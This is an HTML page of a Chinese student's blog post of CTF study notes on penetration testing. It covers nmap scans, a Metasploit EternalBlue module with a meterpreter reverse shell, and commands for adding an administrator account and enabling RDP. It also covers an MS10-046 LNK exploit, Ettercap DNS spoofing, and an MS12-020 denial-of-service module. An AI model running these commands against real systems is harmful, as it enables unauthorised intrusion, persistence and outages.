@@ -1,0 +1,985 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【备赛】2026楚慧杯准备 | 落殷回的博客</title><meta name="author" content="luoyinhui"><meta name="copyright" content="luoyinhui"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="第一份资料   7、渗透测试工具实操与实战  ipconfig ifconfig eth0显示主要网卡信息  包含IPv4地址、MAC地址、数据包统计等 重要参数:  UP表示网卡已启用 RUNNING表示网络连接正常 MTU 1500为标准以太网帧大小     懒人让ai写了个脚本判断ip网段一致性 ping看ttl：  TTL&#x3D;64：通常为Linux系统响应 TTL&#x3D;128：通常为Windo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【备赛】2026楚慧杯准备">
+<meta property="og:url" content="https://luoyinhui.github.io/posts/c9562409/index.html">
+<meta property="og:site_name" content="落殷回的博客">
+<meta property="og:description" content="第一份资料   7、渗透测试工具实操与实战  ipconfig ifconfig eth0显示主要网卡信息  包含IPv4地址、MAC地址、数据包统计等 重要参数:  UP表示网卡已启用 RUNNING表示网络连接正常 MTU 1500为标准以太网帧大小     懒人让ai写了个脚本判断ip网段一致性 ping看ttl：  TTL&#x3D;64：通常为Linux系统响应 TTL&#x3D;128：通常为Windo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://luoyinhui.github.io/img/shouye.png">
+<meta property="article:published_time" content="2026-02-10T05:03:32.000Z">
+<meta property="article:modified_time" content="2026-02-10T15:18:09.482Z">
+<meta property="article:author" content="luoyinhui">
+<meta property="article:tag" content="学生，记录，Python，C，ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://luoyinhui.github.io/img/shouye.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "【备赛】2026楚慧杯准备",
+  "url": "https://luoyinhui.github.io/posts/c9562409/",
+  "image": "https://luoyinhui.github.io/img/shouye.png",
+  "datePublished": "2026-02-10T05:03:32.000Z",
+  "dateModified": "2026-02-10T15:18:09.482Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "luoyinhui",
+      "url": "https://luoyinhui.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/zhandian.png"><link rel="canonical" href="https://luoyinhui.github.io/posts/c9562409/index.html"><link rel="preconnect"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.0"><link rel="stylesheet" href="/pluginsSrc/@fortawesome/fontawesome-free/css/all.min.css?v=7.0.1"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"DLCXYNBEA7","apiKey":"55cb2783d393395612712be2263ebaf1","indexName":"index","hitsPerPage":10,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，耗时 ${time} 毫秒"}},
+  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":1000,"languages":{"author":"作者: luoyinhui","link":"链接: ","source":"来源: 落殷回的博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: '/pluginsSrc/@egjs/infinitegrid/dist/infinitegrid.min.js?v=4.12.0',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【备赛】2026楚慧杯准备',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style type="text/css">#toggle-sidebar {bottom: 80px}</style><style>
+  .aplayer .aplayer-notice{display:none!important}
+</style>
+<link rel="stylesheet" href="/css/custom.css"><style>:root { --glass-opacity-light: 0.5; --glass-opacity-dark: 0.2; --post-glass-opacity-light: 0.8; --post-glass-opacity-dark: 0.2; }</style><!-- hexo injector head_end start --><style>/* CSS for Hexo Butterfly Updates Heatmap */
+.updates-heatmap {
+  margin-bottom: 20px;
+  padding: 20px;
+  background: var(--card-bg, #fff);
+  border-radius: 8px;
+  box-shadow: var(--card-box-shadow, 0 3px 8px 6px rgba(7, 17, 27, 0.05));
+  width: 100%;
+  overflow: hidden;
+  color: var(--font-color, #333);
+}
+
+[data-theme='dark'] .updates-heatmap {
+  background: var(--card-bg, #1d1d1f);
+  color: var(--font-color, #F7F7FA);
+}
+
+.heatmap-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 15px;
+}
+
+.heatmap-title {
+  font-size: 1.2em;
+  font-weight: bold;
+  outline: none;
+  border-bottom: 1px dashed transparent;
+}
+
+.heatmap-title:focus {
+  border-bottom: 1px dashed #999;
+}
+
+.heatmap-legend {
+  display: flex;
+  align-items: center;
+  font-size: 12px;
+  color: var(--font-color, #888);
+  gap: 4px;
+}
+
+.legend-item {
+  display: flex;
+  align-items: center;
+  gap: 2px;
+}
+
+.legend-color {
+  width: 10px;
+  height: 10px;
+  border-radius: 2px;
+  display: inline-block;
+}
+
+.legend-label {
+  color: var(--font-color, #888);
+  margin: 0 4px;
+}
+
+.heatmap-container {
+  width: 100%;
+  display: flex;
+  flex-direction: column;
+}
+
+.heatmap-months {
+  display: grid;
+  grid-template-columns: repeat(53, 1fr);
+  margin-bottom: 5px;
+  width: 100%;
+}
+
+.heatmap-month-label {
+  font-size: 12px;
+  color: var(--font-color, #888);
+  grid-column: span 1;
+  overflow: visible;
+  white-space: nowrap;
+}
+
+.heatmap-grid {
+  display: grid;
+  grid-template-columns: repeat(53, 1fr);
+  grid-template-rows: repeat(7, 1fr);
+  grid-auto-flow: column;
+  gap: 2px;
+  width: 100%;
+}
+
+.heatmap-day {
+  width: 100%;
+  aspect-ratio: 1;
+  border-radius: 2px;
+  background-color: #ebedf0;
+}
+
+[data-theme='dark'] .heatmap-day {
+  background-color: #2d333b;
+}
+
+.legend-color.level-0 { background-color: #ebedf0; }
+[data-theme='dark'] .legend-color.level-0 { background-color: #2d333b; }
+
+/* Green Theme */
+.theme-green .level-1 { background-color: #9be9a8; }
+.theme-green .level-2 { background-color: #40c463; }
+.theme-green .level-3 { background-color: #30a14e; }
+.theme-green .level-4 { background-color: #216e39; }
+
+/* Blue Theme */
+.theme-blue .level-1 { background-color: #a8d1ff; }
+.theme-blue .level-2 { background-color: #63a7ff; }
+.theme-blue .level-3 { background-color: #3079e0; }
+.theme-blue .level-4 { background-color: #1a56ad; }
+
+/* Pink Theme */
+.theme-pink .level-1 { background-color: #ffc9c9; }
+.theme-pink .level-2 { background-color: #ff8585; }
+.theme-pink .level-3 { background-color: #e04545; }
+.theme-pink .level-4 { background-color: #ad1a1a; }
+
+/* Red Theme */
+.theme-red .level-1 { background-color: #ffdce0; }
+.theme-red .level-2 { background-color: #ff9b9b; }
+.theme-red .level-3 { background-color: #ff4b4b; }
+.theme-red .level-4 { background-color: #c91a1a; }
+
+/* Orange Theme */
+.theme-orange .level-1 { background-color: #ffe8cc; }
+.theme-orange .level-2 { background-color: #ffb366; }
+.theme-orange .level-3 { background-color: #ff8c1a; }
+.theme-orange .level-4 { background-color: #cc6600; }
+
+/* Purple Theme */
+.theme-purple .level-1 { background-color: #e6ccff; }
+.theme-purple .level-2 { background-color: #b366ff; }
+.theme-purple .level-3 { background-color: #8c1aff; }
+.theme-purple .level-4 { background-color: #6600cc; }
+
+.updates-show-more-btn {
+  text-align: center;
+  cursor: pointer;
+  padding: 10px 0;
+  background: var(--card-bg, #fff);
+  color: #49b1f5;
+  border: 1px solid #ddd;
+  border-radius: 8px;
+  margin: 20px 0;
+  width: 100%;
+  transition: all 0.3s;
+  user-select: none;
+  display: block;
+  visibility: visible;
+  opacity: 1;
+  font-size: 1.1em;
+}
+
+[data-theme='dark'] .updates-show-more-btn {
+  background: var(--card-bg, #1d1d1f);
+  color: #49b1f5;
+  border: 1px solid #3d3d3d;
+}
+
+.updates-show-more-btn:hover {
+  background: #f0f0f0;
+  color: #FF7242;
+}
+
+[data-theme='dark'] .updates-show-more-btn:hover {
+  background: #3d3d3d;
+}
+
+.year-label {
+  text-align: center;
+  margin-top: 10px;
+  font-size: 0.9em;
+  color: var(--font-color, #999);
+}
+</style><link rel="stylesheet" href="/css/swiper/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/css/swiper/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.0.0"><link rel="alternate" href="/atom.xml" title="落殷回的博客" type="application/atom+xml">
+<link rel="alternate" href="/rss.xml" title="落殷回的博客" type="application/rss+xml">
+</head><body><div id="web_bg" style="background-image: url(/img/shouye.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">84</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/updates/"><i class="fa-fw fas fa-history"></i><span> 更新</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-user-friends"></i><span> 社交</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/shouye.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">落殷回的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">【备赛】2026楚慧杯准备</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/updates/"><i class="fa-fw fas fa-history"></i><span> 更新</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-user-friends"></i><span> 社交</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">【备赛】2026楚慧杯准备</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-10T05:03:32.000Z" title="发表于 2026-02-10 13:03:32">2026-02-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-10T15:18:09.482Z" title="更新于 2026-02-10 23:18:09">2026-02-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%A4%87%E8%B5%9B/">备赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;作者已经&quot;,&quot;messageNext&quot;:&quot;天没有更新了！！可能内容过时哦，如果您发现错误并希望告诉作者，请评论区留言或者向yluo3383@gmail.com发送邮件。&quot;,&quot;postUpdate&quot;:&quot;2026-02-10 23:18:09&quot;}" hidden></div><h1 id="第一份资料"><a class="markdownIt-Anchor" href="#第一份资料"></a> 第一份资料</h1>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E5%A4%87%E8%B5%9B%E3%80%912026%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%87%86%E5%A4%87_image.png" alt="alt text" /></p>
+<h2 id="7-渗透测试工具实操与实战"><a class="markdownIt-Anchor" href="#7-渗透测试工具实操与实战"></a> 7、渗透测试工具实操与实战</h2>
+<ul>
+<li>ipconfig</li>
+<li>ifconfig eth0显示主要网卡信息
+<ul>
+<li>包含IPv4地址、MAC地址、数据包统计等</li>
+<li>重要参数:
+<ul>
+<li>UP表示网卡已启用</li>
+<li>RUNNING表示网络连接正常</li>
+<li>MTU 1500为标准以太网帧大小</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>懒人让ai写了个<a href="/posts/17e1182d/#ip%E7%BD%91%E6%AE%B5%E4%B8%80%E8%87%B4%E6%80%A7%E5%88%A4%E6%96%AD">脚本</a>判断ip网段一致性</li>
+<li>ping看ttl：
+<ul>
+<li>TTL=64：通常为Linux系统响应</li>
+<li>TTL=128：通常为Windows系统响应</li>
+</ul>
+</li>
+</ul>
+<h3 id="kali-msfconsole"><a class="markdownIt-Anchor" href="#kali-msfconsole"></a> kali msfconsole</h3>
+<ul>
+<li>模块：
+<ul>
+<li><strong>exploits：攻击模块</strong></li>
+<li>payloads：定义攻击成功后产生的效果（如反弹shell）</li>
+<li><strong>auxiliary：扫描模块，主要用于漏洞检测</strong></li>
+<li>encoders：编码模块，混淆攻击代码特征实现免杀</li>
+<li>post：后渗透模块</li>
+<li>nops：空指令模块</li>
+<li>evasion：逃逸模块（新版新增）</li>
+</ul>
+</li>
+<li><code>help</code></li>
+</ul>
+<h4 id="nmap"><a class="markdownIt-Anchor" href="#nmap"></a> nmap</h4>
+<ul>
+<li>kali的msfconsole里面的nmap</li>
+</ul>
+<ul>
+<li>
+<p><strong>快速扫描：</strong><br />
+使用 <strong>nmap -F &lt;目标IP&gt;</strong><br />
+进行快速端口扫描，快速发现常见端口的开放状态。</p>
+</li>
+<li>
+<p><strong>深度扫描：</strong><br />
+使用 <strong>nmap -T4 -A &lt;目标IP&gt;</strong><br />
+进行全面扫描，包含操作系统识别、服务版本识别等。</p>
+</li>
+<li>
+<p><strong>TCP全连接扫描：</strong><br />
+使用 <strong>nmap -sT &lt;目标IP&gt;</strong><br />
+建立完整的三次握手，进行TCP连接扫描。</p>
+</li>
+<li>
+<p><strong>操作系统探测：</strong><br />
+使用 <strong>nmap -O &lt;目标IP&gt;</strong><br />
+识别目标操作系统类型和版本。</p>
+</li>
+<li>
+<p><strong>主机存活探测：</strong><br />
+使用 <strong>nmap -sP &lt;目标IP范围&gt;</strong><br />
+进行主机存活探测，确认哪些主机在线。</p>
+</li>
+<li>
+<p><strong>脚本扫描：</strong><br />
+使用 <strong>nmap --script=&lt;脚本名&gt; &lt;目标IP&gt;</strong><br />
+运行特定的脚本（如漏洞扫描）进行深度检查。</p>
+</li>
+<li>
+<p><strong>跳过主机存活检测：</strong><br />
+使用 <strong>nmap -Pn &lt;目标IP&gt;</strong><br />
+跳过ICMP探测，直接扫描端口。</p>
+</li>
+<li>
+<p><strong>扫描多个IP：</strong><br />
+使用 <strong>nmap &lt;目标IP范围&gt;</strong><br />
+可以扫描多个IP地址，查找整个子网的设备。</p>
+</li>
+<li>
+<p><strong>修改TTL值：</strong><br />
+使用 <strong>nmap --ttl=&lt;值&gt; &lt;目标IP&gt;</strong><br />
+修改TTL值，以伪装目标系统。</p>
+</li>
+<li>
+<p><strong>服务版本探测：</strong><br />
+使用 <strong>nmap -sV &lt;目标IP&gt;</strong><br />
+获取端口的服务版本信息，帮助识别潜在的漏洞。<br />
+使用<strong>nmap -sV -p 80,443,445 &lt;目标IP&gt;</strong><br />
+获取80、443、445端口的服务版本信息，帮助分析漏洞。</p>
+</li>
+<li>
+<p><strong>Web应用漏洞扫描：</strong><br />
+使用 <strong>nmap --script=http-vuln* &lt;目标IP&gt;</strong><br />
+使用脚本扫描常见Web漏洞（如永恒之蓝、WebDAV等）。</p>
+</li>
+</ul>
+<h4 id="漏洞攻击"><a class="markdownIt-Anchor" href="#漏洞攻击"></a> 漏洞攻击</h4>
+<ul>
+<li>
+<p><code>search ms08-067</code></p>
+<ul>
+<li>可搜索不同年份漏洞如ms12、ms17</li>
+<li>老版本系统（如2020版）可能只包含部分辅助模块</li>
+</ul>
+</li>
+<li>
+<p>通过<code>use exploit/windows/smb/ms08_067_netapi</code>或<code>use 0</code>（匹配搜索结果序号）调用特定漏洞模块</p>
+</li>
+<li>
+<p><code>show option/payloads</code></p>
+</li>
+<li>
+<p>通过show payloads可查看所有有效载荷，推荐使用windows/meterpreter/reverse_tcp<br />
+meterpreter的优势在于整合系统操作命令，提供更全面的控制功能</p>
+</li>
+<li>
+<p>使用例子：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.100</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">exploit/run</span><br></pre></td></tr></table></figure>
+<ul>
+<li>set设置参数
+<ul>
+<li>RHOSTS：支持单个IP、CIDR范围或文件导入（file:<path>格式）</li>
+<li>LHOST：监听主机IP（建议使用ifconfig确认）</li>
+<li>LPORT：可自定义高端口号（避免使用1024以下端口）</li>
+</ul>
+</li>
+<li>多使用<code>show option</code>去确认</li>
+<li>成功标志：出现Meterpreter session opened提示，显示本地监听端口与目标端口的映射关系（如4444→1044）</li>
+<li>自动识别机制：系统会检测目标OS版本（如Windows XP SP3 English）并自动选择最适合的攻击方案</li>
+</ul>
+<h4 id="具体操作"><a class="markdownIt-Anchor" href="#具体操作"></a> 具体操作</h4>
+<p>权限验证命令:<br />
+Windows: getuid<br />
+Linux: whoami<br />
+shell命令进入目标系统命令行<br />
+账户创建命令: net user 用户名 密码 /add<br />
+管理员权限提升: net localgroup administrators 用户名 /add<br />
+远程登录配置:<br />
+需在目标系统&quot;我的电脑→属性→远程&quot;中启用远程桌面功能<br />
+命令行也可配置远程登录：reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f<br />
+rdesktop命令测试远程连接</p>
+<h4 id="ms10-046漏洞攻击演示"><a class="markdownIt-Anchor" href="#ms10-046漏洞攻击演示"></a> Ms10-046漏洞攻击演示</h4>
+<ul>
+<li>漏洞编号: MS10-046（2010年披露）</li>
+<li>利用对象: Windows快捷方式LNK文件自动执行代码漏洞</li>
+<li>文件特征:
+<ul>
+<li>图标带箭头标记，实际格式为.lnk，本质是文件引用（如指向C盘）</li>
+</ul>
+</li>
+<li>核心缺陷:
+<ul>
+<li>Windows未正确处理LNK文件，特制LNK文件可自动执行指定代码</li>
+</ul>
+</li>
+<li>触发条件:
+<ul>
+<li>仅需资源管理器查看LNK文件所在位置，无需用户主动点击执行</li>
+</ul>
+</li>
+<li>受影响系统：
+<ul>
+<li>Windows XP SP3/SP2</li>
+<li>Vista SP2/SP1</li>
+<li>Server 2008 R2/SP2</li>
+<li>Windows 7</li>
+</ul>
+</li>
+</ul>
+<hr />
+<ul>
+<li>实战
+<ul>
+<li><code>search ms08-067</code></li>
+<li>加载攻击模块和有效载荷模块</li>
+<li>关键参数：
+<ul>
+<li><strong>LHOST：监听地址（必须设置为攻击机IP）</strong></li>
+<li>LPORT：监听端口（默认4444）</li>
+<li><strong>SRVHOST：服务主机（必须与LHOST一致）默认0.0.0.0地址需改为攻击机实际IP</strong></li>
+<li>SRVPORT：服务端口（默认80）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<ul>
+<li>攻击原理：
+<ul>
+<li>利用快捷方式漏洞（.lnk文件）触发代码执行</li>
+<li>通过HTTP服务（80端口）分发恶意负载</li>
+<li>建立反向TCP连接回攻击机</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>大白话就是，我这里在80端口开了服务，里面有攻击命令，让人家ink点击后访问我的服务端口80就执行了危险命令</p>
+</blockquote>
+<ul>
+<li>配合Ettercap内网欺骗
+<ul>
+<li>专业内网欺骗工具，支持图形界面（<code>ettercap -G</code>命令）</li>
+</ul>
+</li>
+<li>DNS欺骗配置：
+<ul>
+<li>修改/etc/ettercap/etter.dns文件</li>
+<li>添加*.com A 攻击机IP</li>
+<li>使所有.com域名解析到攻击机</li>
+</ul>
+</li>
+<li>劫持网段
+<ul>
+<li>执行命令：<code>ettercap -T -q -i eth0 -P dns_spoof</code></li>
+<li>参数说明：
+<ul>
+<li>-T：文本界面模式</li>
+<li>-q：安静模式（不显示输出）</li>
+<li>-i：指定网卡</li>
+<li>-P：使用DNS欺骗插件</li>
+<li>欺骗效果：使目标访问任意.com网站时跳转到攻击机</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<ul>
+<li>继续实战</li>
+<li>标准流程：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/browser/ms10_046...</span><br><span class="line"><span class="built_in">set</span> payload windows/shell/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 攻击机IP</span><br><span class="line"><span class="built_in">set</span> SRVHOST 攻击机IP <span class="comment">#这个漏洞是我自己ip</span></span><br></pre></td></tr></table></figure>
+<hr />
+<ul>
+<li>回显技术要点：
+<ul>
+<li>利用WebDAV协议传递恶意文件</li>
+<li>使用x86/shikata_ga_nai编码器规避检测</li>
+<li>最终建立命令shell会话</li>
+</ul>
+</li>
+</ul>
+<hr />
+<ul>
+<li><code>exit</code>退出session，<code>sessions</code>查看，<code>session 1</code>通过序号重新进入</li>
+</ul>
+<h4 id="ms12-020漏洞攻击演示"><a class="markdownIt-Anchor" href="#ms12-020漏洞攻击演示"></a> MS12-020漏洞攻击演示</h4>
+<ul>
+<li>比较简单就只有ai总结笔记如下</li>
+</ul>
+<ol>
+<li>官方描述<br />
+漏洞性质: 远程桌面协议(RDP)中的漏洞可能允许远程执行代码(2671387)，微软安全等级评定为&quot;严重&quot;<br />
+影响范围: 影响所有支持版本的Windows操作系统，但默认情况下未启用RDP协议的系统不受影响<br />
+修复方式: 通过修改远程桌面处理内存中数据包的方式以及RDP服务处理数据包的方式来解决</li>
+<li>实验提示<br />
+攻击原理: 利用RDP(远程桌面协议)发送特制数据包，RDP是一个多通道(multi-channel)协议<br />
+攻击效果: 该漏洞可用于实施DoS(拒绝服务)攻击，使目标系统蓝屏崩溃<br />
+模块特点: 使用Metasploit中的auxiliary(辅助)模块而非exploit模块，属于辅助攻击手段</li>
+<li>使用辅助模块<br />
+模块选择:<br />
+auxiliary/dos/windows/rdp/ms12_020_maxchannelids: 实施DoS攻击<br />
+auxiliary/scanner/rdp/ms12_020_check: 检查目标是否存在该漏洞<br />
+模块特点: 辅助模块不需要设置payload，因为它不直接获取系统权限<br />
+参数设置: 只需设置RHOSTS(目标IP)和RPORT(默认3389)</li>
+<li>实验演示</li>
+</ol>
+<p>攻击现象: 执行攻击后目标Windows系统立即蓝屏，显示&quot;RDPWD.SYS&quot;相关错误<br />
+技术细节: 错误代码为STOP:0x00000050，表明发生了内存访问冲突<br />
+攻击确认: 模块发送210字节的特制数据包后，检测到RDP服务已停止<br />
+5. 辅助模块设置</p>
+<p>必需参数:<br />
+RHOSTS: 目标主机IP或IP范围(如192.168.10.128)<br />
+RPORT: 远程桌面服务端口，默认为3389<br />
+可选参数: 可使用CIDR表示法指定整个网段进行批量检测<br />
+6. 辅助模块运行</p>
+<p>批量检测: 使用ms12_020_check模块可对整个局域网进行漏洞扫描<br />
+检测限制: 结果可能存在不确定性，需结合其他方法验证<br />
+实战应用: 适合在渗透测试初期快速识别网络中易受攻击的主机<br />
+二、内容总结</p>
+<p>实验特色: 展示了如何利用不同协议和模块产生不同攻击效果，强调辅助模块的重要性<br />
+学习要点:<br />
+理解RDP协议多通道特性与漏洞关系<br />
+掌握Metasploit中auxiliary模块的使用场景<br />
+区分DoS攻击与权限获取攻击的差异<br />
